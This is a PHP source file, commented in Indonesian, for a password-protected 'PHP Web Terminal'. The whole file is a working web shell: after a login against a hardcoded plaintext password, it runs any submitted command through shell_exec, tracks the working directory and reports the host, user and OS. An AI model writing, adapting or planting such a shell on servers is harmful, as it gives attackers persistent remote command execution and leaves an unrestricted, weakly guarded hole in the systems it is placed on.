<?php
session_start();

// KONFIGURASI PASSWORD (GANTI INI!)
$valid_password = "PasswordSangatRahasia123!";

// 1. Logic Login Sederhana
if (isset($_POST['password'])) {
    if ($_POST['password'] === $valid_password) {
        $_SESSION['is_logged_in'] = true;
    } else {
        $error = "Password salah!";
    }
}

// 2. Logic Logout
if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// 3. Cek Sesi Login
if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Login Terminal</title></head>
    <body style="background:#1e1e1e; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;">
        <form method="post" style="border:1px solid #0f0; padding:20px;">
            <h3 style="margin-top:0;">Access Control</h3>
            <?php if(isset($error)) echo "<p style='color:red'>$error</p>"; ?>
            <input type="password" name="password" placeholder="Masukkan Password" style="padding:5px;">
            <button type="submit">Masuk</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// 4. Logic Eksekusi Perintah
$output = '';
$current_dir = getcwd(); // Default directory

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // Fitur ganti direktori (cd) memerlukan penanganan khusus di PHP
    // karena shell_exec membuka proses baru setiap kali dijalankan.
    if (strpos($cmd, 'cd ') === 0) {
        $new_dir = trim(substr($cmd, 3));
        if (chdir($new_dir)) {
            $_SESSION['cwd'] = getcwd(); // Simpan direktori baru ke sesi
            $output = "Directory changed to: " . getcwd();
        } else {
            $output = "Failed to change directory.";
        }
    } else {
        // Jika ada direktori tersimpan di sesi, pindah ke sana dulu sebelum eksekusi
        if (isset($_SESSION['cwd'])) {
            chdir($_SESSION['cwd']);
        }
        
        // Eksekusi perintah dan tangkap stderr (error) juga (2>&1)
        $output = shell_exec($cmd . " 2>&1");
    }
    $current_dir = getcwd();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Web Terminal</title>
    <style>
        body { background-color: #1e1e1e; color: #d4d4d4; font-family: 'Consolas', 'Courier New', monospace; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 20px; }
        .output-box { background-color: #000; color: #0f0; padding: 15px; border-radius: 5px; min-height: 300px; white-space: pre-wrap; overflow-x: auto; margin-bottom: 20px; border: 1px solid #333; }
        input[type="text"] { width: 80%; padding: 10px; background: #2d2d2d; border: 1px solid #444; color: #fff; font-family: inherit; }
        button { padding: 10px 20px; background: #007acc; border: none; color: white; cursor: pointer; }
        button:hover { background: #005f9e; }
        .info { color: #888; font-size: 0.9em; margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <strong>Host:</strong> <?php echo gethostname(); ?> | 
                <strong>User:</strong> <?php echo get_current_user(); ?> | 
                <strong>OS:</strong> <?php echo PHP_OS; ?>
            </div>
            <a href="?action=logout" style="color:#ff6b6b; text-decoration:none;">[ Logout ]</a>
        </div>

        <div class="info">Current Directory: <?php echo $current_dir; ?></div>

        <div class="output-box">
<?php 
if ($output) {
    echo htmlspecialchars($output); 
} else {
    echo "Ready for command...";
}
?>
        </div>

        <form method="post" autocomplete="off">
            <div style="display:flex; gap:10px;">
                <span style="padding-top:10px; color:#0f0;">$</span>
                <input type="text" name="cmd" autofocus placeholder="ls -la, whoami, ping..." required>
                <button type="submit">Run</button>
            </div>
        </form>
    </div>
    
    <script>
        // Auto scroll ke bawah jika output panjang
        const outBox = document.querySelector('.output-box');
        outBox.scrollTop = outBox.scrollHeight;
    </script>
</body>
</html>